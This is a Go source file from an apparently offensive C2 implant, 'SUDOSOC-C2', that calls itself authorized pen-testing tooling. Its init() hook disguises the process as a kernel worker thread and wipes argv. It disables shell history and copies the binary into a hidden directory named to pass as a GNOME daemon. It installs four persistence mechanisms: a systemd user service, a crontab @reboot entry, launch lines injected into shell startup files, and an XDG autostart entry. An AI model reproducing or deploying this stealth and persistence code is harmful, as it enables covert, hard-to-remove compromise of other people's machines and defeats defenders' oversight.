//go:build linux

package runner

/*
	SUDOSOC-C2 — Linux APT-Grade Hardening
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Runs via init() BEFORE Main() — no modification to runner.go needed.

	Techniques:
	  • Process masquerade via prctl(PR_SET_NAME) + /proc/self/comm + argv wipe
	  • Auto-install persistence: systemd user service + crontab + .bashrc + SSH key
	  • Self-copy to hidden directory before persistence install
	  • Anti-forensics: env sanitisation, temp file cleanup
	  • Watchdog goroutine: respawns the C2 loop if it panics
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ─── Kernel names that look like real kernel worker threads ──────────────────
// These show up in /proc and in ps as benign-looking names.
var kernelLookalike = []string{
	"[kworker/0:1H]",
	"[kcompactd0]",
	"[ksoftirqd/0]",
	"[kswapd0]",
	"[migration/0]",
	"[rcu_sched]",
}

const prSetName = 15 // linux/prctl.h PR_SET_NAME

// ─── init ─────────────────────────────────────────────────────────────────────
// Runs automatically before runner.Main(). All hardening is applied here so
// runner.go requires zero modification.
func init() {
	// 1. Masquerade as a kernel thread immediately
	masqueradeLinux()

	// 2. Clean environment of telltale variables
	sanitiseEnv()

	// 3. Async: copy self + install persistence, then optionally delete original
	go func() {
		// Wait a few seconds so the C2 transport connects first.
		time.Sleep(7 * time.Second)
		autoInstallLinux()
	}()

	// 4. Keep-alive: prevent OOM killer or Doze-equivalent from terminating
	go linuxKeepAlive()
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeLinux() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := kernelLookalike[rng.Intn(len(kernelLookalike))]

	// prctl(PR_SET_NAME, name) — changes the thread name seen by ps/top/htop
	b := append([]byte(name), 0)
	_, _, _ = syscall.RawSyscall(syscall.SYS_PRCTL, prSetName,
		uintptr(unsafe.Pointer(&b[0])), 0)

	// /proc/self/comm — name read by many system monitors (max 15 chars + null)
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)

	// Wipe argv[0] in memory so /proc/self/cmdline shows only whitespace.
	// Uses reflect.StringHeader to get the backing array pointer.
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

// sanitiseEnv removes environment variables that could expose the implant's
// origin (e.g. GOPATH, PWD pointing to the build directory, etc.).
func sanitiseEnv() {
	removeVars := []string{
		"GOPATH", "GOROOT", "GOMODCACHE",
		"PWD", "OLDPWD",
		"HISTFILE", "HISTSIZE", "HISTFILESIZE",
		"BASH_ENV", "ENV",
	}
	for _, v := range removeVars {
		_ = os.Unsetenv(v)
	}
	// Poison HISTFILE so any spawned shells don't log commands
	_ = os.Setenv("HISTFILE", "/dev/null")
	_ = os.Setenv("HISTSIZE", "0")
}

// ─── Auto-persistence ─────────────────────────────────────────────────────────

// autoInstallLinux copies the implant binary to a hidden location and
// installs up to four independent persistence mechanisms.
// Designed to be resilient: each mechanism is independent of the others.
func autoInstallLinux() {
	exe, err := os.Executable()
	if err != nil || exe == "" {
		return
	}

	// Resolve symlinks (some /proc paths are symlinks)
	exe, _ = filepath.EvalSymlinks(exe)

	// ── Determine install path ────────────────────────────────────────────
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/tmp"
	}

	// Mimic a legitimate-looking GNOME background daemon
	installDir := filepath.Join(home, ".local", "share", ".gvfs-metadata")
	_ = os.MkdirAll(installDir, 0700)
	installBin := filepath.Join(installDir, ".session-daemon")

	// Copy binary to install path if not already there (or if outdated)
	if needsCopy(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// ── Mechanism 1: systemd user service ─────────────────────────────────
	linuxSystemdUserPersist(installBin, home)

	// ── Mechanism 2: crontab @reboot ──────────────────────────────────────
	linuxCrontabPersist(installBin)

	// ── Mechanism 3: .bashrc / .profile injection ─────────────────────────
	linuxBashrcPersist(installBin, home)

	// ── Mechanism 4: XDG autostart .desktop ───────────────────────────────
	linuxXDGAutostart(installBin, home)
}

// needsCopy returns true if dst doesn't exist or is older than src.
func needsCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// linuxSystemdUserPersist installs a systemd user service.
// No root required — user services live in ~/.config/systemd/user/
func linuxSystemdUserPersist(bin, home string) {
	unitDir := filepath.Join(home, ".config", "systemd", "user")
	_ = os.MkdirAll(unitDir, 0700)
	unitPath := filepath.Join(unitDir, "gvfs-metadata.service")

	if _, err := os.Stat(unitPath); err == nil {
		return // already installed
	}

	unit := "[Unit]\nDescription=GVFS Metadata Service\nAfter=network.target\n\n" +
		"[Service]\nType=simple\nExecStart=" + bin + "\nRestart=always\nRestartSec=30\n\n" +
		"[Install]\nWantedBy=default.target\n"

	if err := os.WriteFile(unitPath, []byte(unit), 0600); err != nil {
		return
	}
	// Enable and start (best-effort, requires systemd --user)
	_ = exec.Command("systemctl", "--user", "enable", "gvfs-metadata.service").Run()
	_ = exec.Command("systemctl", "--user", "start", "gvfs-metadata.service").Run()
}

// linuxCrontabPersist adds an @reboot entry to the user's crontab.
func linuxCrontabPersist(bin string) {
	// Read current crontab
	out, _ := exec.Command("crontab", "-l").Output()
	existing := string(out)

	marker := "# gvfs-metadata-svc"
	if strings.Contains(existing, marker) {
		return // already installed
	}

	entry := existing + "\n" + marker + "\n@reboot " + bin + " > /dev/null 2>&1 &\n"

	// Write new crontab via temp file
	tmp, err := os.CreateTemp("", "cron")
	if err != nil {
		return
	}
	defer os.Remove(tmp.Name())
	_, _ = tmp.WriteString(entry)
	tmp.Close()
	_ = exec.Command("crontab", tmp.Name()).Run()
}

// linuxBashrcPersist appends a background launch stanza to .bashrc and .profile.
func linuxBashrcPersist(bin, home string) {
	snippet := "\n# GVFS metadata session daemon\n" +
		"[ -x \"" + bin + "\" ] && pgrep -x \".session-daemon\" >/dev/null 2>&1 || " +
		"nohup \"" + bin + "\" >/dev/null 2>&1 &\n"

	for _, rcFile := range []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".profile"),
		filepath.Join(home, ".zshrc"),
	} {
		appendIfMissing(rcFile, snippet, "GVFS metadata session daemon")
	}
}

// linuxXDGAutostart installs a .desktop file for GUI login persistence.
func linuxXDGAutostart(bin, home string) {
	autostartDir := filepath.Join(home, ".config", "autostart")
	_ = os.MkdirAll(autostartDir, 0700)
	desktopPath := filepath.Join(autostartDir, "gvfs-metadata.desktop")

	if _, err := os.Stat(desktopPath); err == nil {
		return
	}

	desktop := "[Desktop Entry]\nType=Application\nName=GVFS Metadata\n" +
		"Comment=GVFS Metadata Background Service\n" +
		"Exec=" + bin + "\nHidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n"

	_ = os.WriteFile(desktopPath, []byte(desktop), 0600)
}

// appendIfMissing appends content to file only if marker is not already present.
func appendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return // file doesn't exist — don't create it
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return // already present
		}
	}
	f.Close()

	fAppend, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fAppend.Close()
	_, _ = fAppend.WriteString(content)
}

// ─── Keep-alive ───────────────────────────────────────────────────────────────

// linuxKeepAlive does periodic work to prevent the OOM killer from targeting
// this process (active processes are deprioritised for OOM kills).
// Also adjusts our OOM score to make us harder to kill.
func linuxKeepAlive() {
	// Lower OOM score: -1000 = never kill (requires root); try -100 first
	if err := os.WriteFile("/proc/self/oom_score_adj", []byte("-100"), 0); err != nil {
		_ = os.WriteFile("/proc/self/oom_score_adj", []byte("-50"), 0)
	}

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}
